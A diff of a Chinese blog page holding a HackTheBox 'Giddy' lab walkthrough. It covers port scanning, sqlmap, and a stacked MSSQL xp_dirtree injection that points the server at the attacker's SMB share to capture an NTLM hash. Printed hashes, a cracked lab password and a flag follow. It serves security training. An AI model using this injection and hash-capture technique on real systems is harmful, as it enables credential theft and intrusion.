@@ -1,382 +1,204 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
+<html lang="zh-CN" color-mode="light">
 
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/favicon.ico">
-  <link rel="icon" href="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/favicon.ico">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="076w" />
+  <!-- Open Graph Description 简短摘要-->
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="076w">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="Giddy_Medium信息收集12345678910111213141516namp：--min-rate 10000    10000速率来扫描-p-   全端口-p80,135    指定80，135端口扫描-sU   指定udp扫描-sT   指定tcp协议-sV   扫描服务版本-sC   默认脚本扫描-O    对操作系统和版本探测--script&#x3D;vuln   进行基础漏洞扫描nma">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Giddy_Medium">
-<meta property="og:url" content="http://syst1m.cn/2023/10/24/Giddy_Medium/index.html">
-<meta property="og:site_name" content="076w&#39;s World">
-<meta property="og:description" content="Giddy_Medium信息收集12345678910111213141516namp：--min-rate 10000    10000速率来扫描-p-   全端口-p80,135    指定80，135端口扫描-sU   指定udp扫描-sT   指定tcp协议-sV   扫描服务版本-sC   默认脚本扫描-O    对操作系统和版本探测--script&#x3D;vuln   进行基础漏洞扫描nma">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451694.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451695.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451696.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451697.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451698.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451699.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451700.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451701.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451702.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451703.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451704.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451705.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451706.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451707.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451708.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451709.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451710.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451711.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451712.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451713.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451714.png">
-<meta property="article:published_time" content="2023-10-24T15:01:40.000Z">
-<meta property="article:modified_time" content="2024-02-22T06:53:13.081Z">
-<meta property="article:author" content="076w">
-<meta property="article:tag" content="HackTheBox">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451694.png">
+  <!-- 用于搜索引擎的文章摘要 -->
   
   
-    <meta name="referrer" content="no-referrer-when-downgrade">
   
+  <title>
+    
+      Giddy_Medium 
+      
+      
+      |
+    
+     076w&#39;s World
+  </title>
+
   
-  <title>Giddy_Medium - 076w&#39;s World</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
   
 
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
 
 
+  
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"syst1m.cn","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
 
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-    <!-- Google tag (gtag.js) -->
-    <script async>
-      if (!Fluid.ctx.dnt) {
-        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
-          window.dataLayer = window.dataLayer || [];
-          function gtag() {
-            dataLayer.push(arguments);
-          }
-          gtag('js', new Date());
-          gtag('config', '');
-        });
-      }
-    </script>
-  
-
-  
-
-  
-
-  
-
-  
-
-
-
-  
 <meta name="generator" content="Hexo 6.3.0"></head>
 
 
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>076w&#39;s World</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" target="_blank" rel="noopener" href="https://www.yuque.com/076w">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                <span>友链</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/home_top_bg.webp') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="Giddy_Medium"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-author" aria-hidden="true"></i>
-        076w
-      </span>
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-24 23:01" pubdate>
-          2023年10月24日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          5.4k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          45 分钟
-        
-      </span>
-    
-
-    
-    
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
       
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> 次
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">076w's World</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Giddy_Medium</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-02-22 14:53:13
         </span>
         
-      
-    
-  </div>
-
-
-        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/HackTheBox/" title="HackTheBox">
+                    #HackTheBox
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">Giddy_Medium</h1>
-            
-              <p class="note note-info">
-                
-                  
-                    本文最后更新于：6 小时前
-                  
-                
-              </p>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="Giddy-Medium"><a href="#Giddy-Medium" class="headerlink" title="Giddy_Medium"></a>Giddy_Medium</h2><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451694.png" srcset="/img/loading.gif" lazyload alt="img"></h4><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">namp：<br>--min-rate 10000    10000速率来扫描<br>-p-   全端口<br>-p80,135    指定80，135端口扫描<br>-sU   指定udp扫描<br>-sT   指定tcp协议<br>-sV   扫描服务版本<br>-sC   默认脚本扫描<br>-O    对操作系统和版本探测<br>--script=vuln   进行基础漏洞扫描<br><br><br>nmap -p-  --min-rate 10000  10.129.96.140<br>nmap -p- -sU --min-rate 10000  10.129.96.140<br>nmap -p80,443,3389,5985 -sV -sC -sT -O 10.129.96.140<br>nmap -p80,443,3389,5985 --script=vuln 10.129.96.140<br></code></pre></td></tr></table></figure>
+      <div class="markdown-body">
+        <h2 id="Giddy-Medium"><a href="#Giddy-Medium" class="headerlink" title="Giddy_Medium"></a>Giddy_Medium</h2><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451694.png" alt="img"></h4><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">namp：<br>--min-rate 10000    10000速率来扫描<br>-p-   全端口<br>-p80,135    指定80，135端口扫描<br>-sU   指定udp扫描<br>-sT   指定tcp协议<br>-sV   扫描服务版本<br>-sC   默认脚本扫描<br>-O    对操作系统和版本探测<br>--script=vuln   进行基础漏洞扫描<br><br><br>nmap -p-  --min-rate 10000  10.129.96.140<br>nmap -p- -sU --min-rate 10000  10.129.96.140<br>nmap -p80,443,3389,5985 -sV -sC -sT -O 10.129.96.140<br>nmap -p80,443,3389,5985 --script=vuln 10.129.96.140<br></code></pre></td></tr></table></figure>
 
 <p>扫描端口发现其开放 80，443，3389，5985端口 有用的一些信息为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">关于远程桌面协议（RDP）的NTLM认证信息<br><br>Target_Name: GIDDY：目标的名称是GIDDY。<br>NetBIOS_Domain_Name: GIDDY：在NetBIOS中，目标的域名是GIDDY。<br>NetBIOS_Computer_Name: GIDDY：在NetBIOS中，目标计算机的名称是GIDDY。<br>DNS_Domain_Name: Giddy：在DNS中，目标的域名是Giddy。<br>DNS_Computer_Name: Giddy：在DNS中，目标计算机的名称是Giddy。<br>Product_Version: 10.0.14393：目标系统的产品版本是 10.0.14393<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451695.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451695.png" alt="img"></p>
 <p>访问80&#x2F;443页面均为小狗图片，无功能点，使用dirsearch扫描路径</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python3 dirsearch.py -r -u https://10.129.96.140/<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451696.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451696.png" alt="img"></p>
 <p>获取到的有效目录为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">https://10.129.96.140/mvc/<br>https://10.129.96.140/Remote/en-US/logon.aspx?ReturnUrl=%2fremote%2flogin<br></code></pre></td></tr></table></figure>
 
 <p>一个购物页面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451697.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451697.png" alt="img"></p>
 <p>一个web端的powershell登录页面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451698.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451698.png" alt="img"></p>
 <h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>在 <a target="_blank" rel="noopener" href="https://10.129.96.140/mvc/">https://10.129.96.140/mvc/</a> 页面发现多处SQL注入漏洞</p>
 <p>如：<a target="_blank" rel="noopener" href="https://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=24">https://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=24</a>  经典的单引号报错</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451699.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451699.png" alt="img"></p>
 <p>放进sqlmap</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">sqlmap -u https://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=24 --batch --is-dba --dbs<br><br>--batch		告诉sqlmap以批处理模式运行，即自动化执行所有的测试和攻击步骤，而无需用户交互。这对于批量测试多个目标非常有用。<br>--is-dba	用于检测当前用户是否具有数据库管理员（DBA）权限。如果当前用户是DBA，sqlmap将使用更强大的技术和攻击方法来探测和利用漏洞。<br>--dbs		用于获取目标数据库服务器上的所有可用数据库列表。sqlmap将尝试枚举并列出目标服务器上的数据库名称。<br></code></pre></td></tr></table></figure>
 
@@ -388,7 +210,7 @@
 <li>目标网站使用的Web应用技术是ASP.NET，Web服务器是Microsoft IIS 10.0，ASP.NET的版本是4.0.30319</li>
 <li>发现5个可用的数据库，它们分别是：Injection，master，model，msdb，tempdb</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451700.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451700.png" alt="img"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>将数据库dump出来查看，无可用信息。</p>
 <p>通过mssql 堆叠注入，利用函数 xp_dirtree + UNC 可以触发 NTLM 认证，带出服务器的 NET-NTLM hash</p>
 <p>这里参考了三篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43645782/article/details/106891013">mssql堆叠注入利用总结</a>，[<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VthAAS5b93hZGaDGLqgQLQ">域渗透] SQLSERVER 结合中继与委派</a>，<a target="_blank" rel="noopener" href="https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html">How to Use xp_dirtree to List All Files in a Folder – Everyday SQL</a></p>
@@ -397,451 +219,401 @@
 <p>使用 impacket-smbserver，通过xp_dirtree函数连接到该服务获取到相应的哈希</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">mkdir smb 	# 创建 smb 目录<br>cd smb 			# 进入 smb目录<br>impacket-smbserver share `pwd` 		# 在当前目录启动 SMB server，共享名称为 share，反引号 pwd 来获取当前目录的路径，并将该路径作为共享目录。在命令执行后，其他计算机可以通过SMB协议访问共享名称为 &quot;share&quot; 的目录<br>;exec xp_dirtree &#x27;\\10.10.14.15\share&#x27;;--<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451701.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451702.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451701.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451702.png" alt="img"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[*] Config file parsed<br>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Incoming connection (10.129.96.140,49714)<br>[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)<br>[*] User GIDDY\Stacy authenticated successfully<br>[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:334223febb33d8eeef0ee93deddbd9a9:0101000000000000007f1f005206da0140031a75096245b600000000010010006200710047004d00530076004f004700030010006200710047004d00530076004f004700020010006f00470076004f004b0063007a005400040010006f00470076004f004b0063007a00540007000800007f1f005206da0106000400020000000800300030000000000000000000000000300000fe20d99ed518821e757fa75f815931c59c97175ac0244f99b0e3d6f0708293f20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000<br>[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)<br>[*] User GIDDY\Stacy authenticated successfully<br>[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:3ccb4ab60836158fa44c35c421fb2dea:010100000000000000ac50015206da014aaa6878a74ae00c00000000010010006200710047004d00530076004f004700030010006200710047004d00530076004f004700020010006f00470076004f004b0063007a005400040010006f00470076004f004b0063007a0054000700080000ac50015206da0106000400020000000800300030000000000000000000000000300000fe20d99ed518821e757fa75f815931c59c97175ac0244f99b0e3d6f0708293f20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000<br>[*] Disconnecting Share(1:SHARE)<br>[*] Closing down connection (10.129.96.140,49714)<br>[*] Remaining connections []<br></code></pre></td></tr></table></figure>
 
 <p>使用john破解hash</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">john --wordlist=/usr/share/wordlists/rockyou.txt hash<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451703.png" srcset="/img/loading.gif" lazyload alt="img">用户名：GIDDY\Stacy		密码：xNnWo6272k7x</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451704.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451705.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451703.png" alt="img">用户名：GIDDY\Stacy		密码：xNnWo6272k7x</p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451704.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451705.png" alt="img"></p>
 <p>在Desktop目录找到第一个flag:5499a3fdc3d0a109edec1897db85ad44</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451706.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451706.png" alt="img"></p>
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>当前用户权限过低，大部分命令无法执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451707.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451707.png" alt="img"></p>
 <p>谷歌一下unifivideo，发现是一个视频监控服务，UniFi Video是Ubiquiti Networks开发的一个视频监控软件，旨在提供易于使用的视频监控解决方案。它可以通过Ubiquiti的UniFi NVR硬件或在用户自己的服务器上运行。</p>
 <p>UniFi Video支持多种视频监控设备和摄像头，并提供了许多功能，如实时监控、录像回放、活动检测、警报通知等。此外，它还提供了一个基于Web的用户界面，可让用户轻松管理和配置其视频监控系统。</p>
